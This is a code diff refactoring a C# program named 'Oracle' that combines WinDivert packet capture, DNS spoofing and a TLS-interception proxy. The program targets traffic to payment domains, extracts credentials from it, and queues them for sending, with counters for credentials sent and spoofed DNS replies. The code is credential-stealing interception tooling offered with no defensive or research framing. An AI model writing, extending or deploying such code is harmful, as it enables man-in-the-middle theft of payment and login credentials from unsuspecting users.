@@ -59,6 +59,7 @@ for (int i = 0; i < args.Length; i++)
 
 // ── Services ──────────────────────────────────────────
 
+
 var credQueue = new CredentialQueue(config);
 var connTracker = new ConnectionTracker(config);
 var packetFilter = new PacketFilter(config.PayDomains);
@@ -67,39 +68,31 @@ var httpParser = new HttpParser();
 var extractor = new CredentialExtractor(httpParser);
 var ruleEngine = new Oracle.Extractor.RuleEngine();
 
-// Try WinDivert driver first, fall back to mock
-var captureDriver = CreateCaptureDriver();
+// Channel Manager
 
+var channelMgr = new ChannelManager();
+
+var winDivertCh = new WinDivertChannel(config, connTracker, packetFilter);
+channelMgr.Register(winDivertCh);
+
+var dnsSpoofCh = new DnsSpoofChannel();
+channelMgr.Register(dnsSpoofCh);
+
+var tlsProxyCh = new TlsProxyChannel(config, certMgr, credQueue, ruleEngine);
+channelMgr.Register(tlsProxyCh);
+
+// Legacy: CaptureService wrapping WinDivert driver for packet stats
+var captureDriver = CreateCaptureDriver();
 static ICaptureDriver CreateCaptureDriver()
 {
-    try
-    {
-        var driver = new WinDivertDriver();
-        // Don't Open() here - CaptureService.Start() handles that after subscribing events
-        Console.WriteLine("[Oracle] ✅ WinDivert driver created (will open on capture start)");
-        return driver;
-    }
+    try { return new WinDivertDriver(); }
     catch (Exception ex)
     {
-        Console.WriteLine($"[Oracle] ⚠️ WinDivert unavailable: {ex.Message}");
+        Console.WriteLine($"[Oracle] WinDivert unavailable: {ex.Message}");
         return new MockCaptureDriver();
     }
 }
 var captureService = new CaptureService(config, connTracker, packetFilter, captureDriver);
-
-// DnsSpoofer 单独处理，启动失败不阻塞整体
-DnsSpoofer? dnsSpoofer = null;
-try
-{
-    dnsSpoofer = new DnsSpoofer();
-    Console.WriteLine("[Oracle] ✅ DnsSpoofer created");
-}
-catch (Exception ex)
-{
-    Console.WriteLine($"[Oracle] ⚠️ DnsSpoofer unavailable: {ex.Message}");
-}
-
-var tlsProxy = new TlsProxy(config, certMgr, credQueue, ruleEngine);
 
 // ── ASP.NET Core Minimal API ──────────────────────────
 
@@ -126,7 +119,9 @@ app.UseStaticFiles();
 app.MapGet("/status", () =>
 {
     var uptime = DateTime.UtcNow - _startTime;
-    var wDriver = captureDriver as WinDivertDriver;
+    var tp = channelMgr.Get("TlsProxy") as TlsProxyChannel;
+    var ds = channelMgr.Get("DnsSpoof") as DnsSpoofChannel;
+    var wd = channelMgr.Get("WinDivert") as WinDivertChannel;
     return Results.Ok(new
     {
         status = captureService.IsRunning ? "running" : "stopped",
@@ -134,28 +129,23 @@ app.MapGet("/status", () =>
         uptime_seconds = uptime.TotalSeconds,
         packets_captured = captureService.PacketsCaptured,
         packets_filtered = captureService.PacketsFiltered,
-        driver_packets = wDriver?.DirectPacketCount ?? -1,
+        driver_packets = wd?.PacketsCaptured ?? -1,
         active_connections = connTracker.ActiveCount,
-        active_tls_sessions = tlsProxy.ActiveConnections,
-        total_connections = tlsProxy.TotalConnections,
+        active_tls_sessions = tp?.ActiveConnections ?? 0,
+        total_connections = tp?.TotalConnections ?? 0,
         credentials_queued = credQueue.TotalEnqueued,
         credentials_sent = credQueue.TotalSent,
         credentials_failed = credQueue.TotalFailed,
-        dns_spoofed = dnsSpoofer?.SpoofedCount ?? -1,
+        dns_spoofed = ds?.SpoofedCount ?? -1,
     });
 });
 
 // Start capture
 app.MapPost("/start", () =>
 {
-    // TLS proxy must start first (before capture or DNS redirect)
-    tlsProxy.Start();
+    channelMgr.StartAllAsync().GetAwaiter().GetResult();
     if (captureDriver is WinDivertDriver)
         captureService.Start();
-    if (dnsSpoofer != null)
-    {
-        try { dnsSpoofer.Start(); } catch (Exception ex) { Console.Error.WriteLine($"[Oracle] DnsSpoofer start failed: {ex.Message}"); }
-    }
     return Results.Ok(new { status = "started" });
 });
 
@@ -163,8 +153,7 @@ app.MapPost("/start", () =>
 app.MapPost("/stop", () =>
 {
     captureService.Stop();
-    tlsProxy.Stop();
-    dnsSpoofer?.Stop();
+    channelMgr.StopAllAsync().GetAwaiter().GetResult();
     return Results.Ok(new { status = "stopped" });
 });
 
@@ -182,9 +171,9 @@ app.MapGet("/stats", () =>
         },
         tls_proxy = new
         {
-            active_sessions = tlsProxy.ActiveConnections,
-            total_connections = tlsProxy.TotalConnections,
-            failed_connections = tlsProxy.FailedConnections,
+            active_sessions = tlsProxyCh.ActiveConnections,
+            total_connections = tlsProxyCh.TotalConnections,
+            failed_connections = tlsProxyCh.FailedConnections,
         },
         credentials = new
         {
@@ -396,8 +385,7 @@ lifetime.ApplicationStopping.Register(() =>
 {
     Console.WriteLine("[Oracle] Shutting down...");
     captureService.Stop();
-    tlsProxy.Stop();
-    dnsSpoofer?.Dispose();
+    channelMgr.StopAllAsync().GetAwaiter().GetResult();
     credQueue.Dispose();
     Console.WriteLine("[Oracle] Credential queue flushed. Goodbye.");
 });
